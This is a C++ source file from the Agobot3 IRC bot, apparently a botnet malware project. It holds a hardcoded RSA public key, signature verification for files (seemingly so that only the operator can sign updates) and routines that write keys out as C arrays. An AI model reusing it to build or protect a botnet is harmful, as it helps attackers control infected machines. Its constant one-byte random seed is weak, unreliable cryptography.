/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "rsalib.h"

char pubkey[]=
    "\x00\x04\x00\x00\xB8\x31\x41\x4E\x0B\x46\x13\x92\x2B\xD3\x5B\x4B\x36"
    "\x80\x2B\xC1\xE1\xE8\x1C\x95\xA2\x7C\x95\x8F\x53\x82\x00\x3D\xF6\x46"
    "\x15\x4C\xA9\x2F\xC1\xCE\x02\xC3\xBE\x04\x7A\x45\xE9\xB0\x2A\x90\x89"
    "\xB4\xB9\x02\x78\x23\x7C\x96\x51\x92\xA0\xFC\xC8\x6B\xB4\x9B\xC8\x2A"
    "\xE6\xFD\xC2\xDE\x70\x90\x06\xB8\x6C\x76\x76\xEF\xDF\x59\x76\x26\xFA"
    "\xD6\x33\xA4\xF7\xDC\x48\xC4\x45\xD3\x7E\xB5\x5F\xCB\x3B\x1A\xBB\x95"
    "\xBA\xAA\x82\x6D\x53\x90\xE1\x5F\xD1\x4E\xD4\x03\xFA\x2D\x0C\xB8\x41"
    "\xC6\x50\x60\x95\x24\xEC\x55\x5E\x3B\xC5\x6C\xA9\x57\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x01\x00\x01";

#pragma comment(lib, "RSAGlue.lib")

CRSALib::CRSALib()
{	InitRandomStruct(&m_rsaRandomStruct);
	memcpy(&m_rsaPublicKey, pubkey, sizeof(rsa::R_RSA_PUBLIC_KEY));
}

CRSALib::~CRSALib()
{
}

void CRSALib::InitRandomStruct(rsa::R_RANDOM_STRUCT *pRandomStruct)
{	static unsigned char cSeed=0; unsigned int iBytesNeeded;
	rsa::R_RandomInit (pRandomStruct); while(true)
	{	rsa::R_GetRandomBytesNeeded(&iBytesNeeded, pRandomStruct);
		if(!iBytesNeeded) break; rsa::R_RandomUpdate (pRandomStruct, &cSeed, 1); } }

bool CRSALib::VerifyFile(const char *szFile, const char *szSigFile)
{	FILE *fp; rsa::R_SIGNATURE_CTX rsaContext; int iStatus=1;
	unsigned char szPartIn[16];						unsigned int iPartInLen;
	unsigned char szSignature[MAX_SIGNATURE_LEN];	unsigned int iSignatureLen;
	
	if(ReadInit(&fp, szFile)!=0) return false;
	
	do
	{	if(ReadBlock(szSigFile, szSignature, &iSignatureLen, sizeof(szSignature))!=0) break;
		if((iStatus=rsa::R_VerifyInit(&rsaContext, DA_MD5))!=0) break;
		while(!ReadUpdate(fp, szPartIn, &iPartInLen, sizeof(szPartIn)))
			if((iStatus=rsa::R_VerifyUpdate(&rsaContext, szPartIn, iPartInLen))!=0) break;
		if(iStatus) break;
		if((iStatus=rsa::R_VerifyFinal(&rsaContext, szSignature, iSignatureLen, &m_rsaPublicKey))!=0) break;
	} while(false);
	
	ReadFinal(fp); if(iStatus) return false; else return true; }

int CRSALib::ReadInit(FILE **pfp, const char *szFile)
{	if((*pfp=fopen(szFile, "rb"))!=NULL) return 0; else return 1; }
int CRSALib::ReadUpdate(FILE *fp, unsigned char *szPartOut, unsigned int *iPartOutLen, unsigned int iMaxPartOutLen)
{	int iStatus=0; *iPartOutLen=fread(szPartOut, 1, iMaxPartOutLen, fp);
	if(ferror(fp)) iStatus=1; if(*iPartOutLen==0&&feof(fp)) iStatus=1;
	return iStatus; }
void CRSALib::ReadFinal(FILE *fp) { fclose(fp); }
int CRSALib::ReadBlock(const char *szFile, unsigned char *szBlock, unsigned int *iBlockLen, unsigned int iMaxBlockLen)
{	FILE *fp; int iStatus; unsigned char *szDummy=NULL; unsigned int iDummyLen;
	if(ReadInit(&fp, szFile)) return 1;
	if((iStatus=ReadUpdate(fp, szBlock, iBlockLen, iMaxBlockLen))==0)
		if(*iBlockLen==iMaxBlockLen) if(!ReadUpdate(fp, szDummy, &iDummyLen, 1)) iStatus=1;
	ReadFinal(fp); return iStatus; }

void CRSALib::WritePublicKey(rsa::R_RSA_PUBLIC_KEY *prsaKey, const char *szFile)
{	FILE *fp; if((fp=fopen(szFile, "w"))==NULL) return; char *szTemp=(char*)prsaKey;
	int iColCount=0; fprintf(fp, "char pubkey[]=\n{\t\"");
	for(int i=0;i<sizeof(rsa::R_RSA_PUBLIC_KEY);i++)
	{	fprintf(fp, "\\x%0.2X", (unsigned char)(szTemp[i])); iColCount++;
		if(iColCount>16) { fprintf(fp, "\",\n\t\""); iColCount=0; } }
	fprintf(fp, "\"; };\n"); if(fp) fclose(fp); }

void CRSALib::WritePrivateKey(rsa::R_RSA_PRIVATE_KEY *prsaKey, const char *szFile)
{	FILE *fp; if((fp=fopen(szFile, "w"))==NULL) return; char *szTemp=(char*)prsaKey;
	int iColCount=0; fprintf(fp, "char privkey[]=\n{\t\"");
	for(int i=0;i<sizeof(rsa::R_RSA_PRIVATE_KEY);i++)
	{	fprintf(fp, "\\x%0.2X", (unsigned char)(szTemp[i])); iColCount++;
		if(iColCount>16) { fprintf(fp, "\",\n\t\""); iColCount=0; } }
	fprintf(fp, "\"; };\n"); if(fp) fclose(fp); }

